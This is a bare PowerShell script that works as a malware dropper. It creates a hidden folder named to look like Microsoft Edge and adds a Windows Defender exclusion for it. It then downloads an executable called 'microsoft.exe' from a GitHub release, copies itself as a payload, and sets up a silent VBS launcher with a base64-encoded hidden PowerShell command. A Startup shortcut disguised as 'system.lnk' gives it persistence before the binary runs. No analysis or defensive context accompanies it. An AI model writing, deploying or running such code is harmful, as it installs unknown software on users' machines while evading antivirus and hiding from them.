# Target hidden directory
$targetPath = "$env:APPDATA\MicrosoftEdge\"
New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
Add-MpPreference -ExclusionPath $targetPath

# Define repo and EXE to download
$repo = "BotSolo621/WLP"
$file = "microsoft.exe"
$releases = "https://api.github.com/repos/$repo/releases"
Write-Host "Determining latest release"
$tag = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].tag_name
$download = "https://github.com/$repo/releases/download/$tag/$file"
$exePath = Join-Path $targetPath $file

# Download EXE
Write-Host "Downloading latest release"
Invoke-WebRequest $download -OutFile $exePath -UseBasicParsing
Write-Host "Download complete: $exePath"

# Copy this script as payload.ps1
$myScriptPath = $MyInvocation.MyCommand.Path
$payloadPath = Join-Path $targetPath "payload.ps1"
Copy-Item -Path $myScriptPath -Destination $payloadPath -Force

# Encode the PowerShell command
$command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Create a .vbs file to silently launch PowerShell
$vbsPath = Join-Path $targetPath "invis.vbs"
$vbsContent = @"
Set WshShell = CreateObject(""WScript.Shell"")
WshShell.Run ""powershell.exe -EncodedCommand $encodedCommand"", 0
"@
$vbsContent | Set-Content -Path $vbsPath -Encoding ASCII

# Create shortcut in Startup folder
$WScriptShell = New-Object -ComObject WScript.Shell
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcut = $WScriptShell.CreateShortcut("$startupPath\system.lnk")
$shortcut.TargetPath = $vbsPath
$shortcut.WorkingDirectory = $targetPath
$shortcut.Save()

# Optional debug log
Add-Content "$targetPath\log.txt" "Startup setup complete at $(Get-Date)"

# Launch EXE now
Start-Process -FilePath $exePath
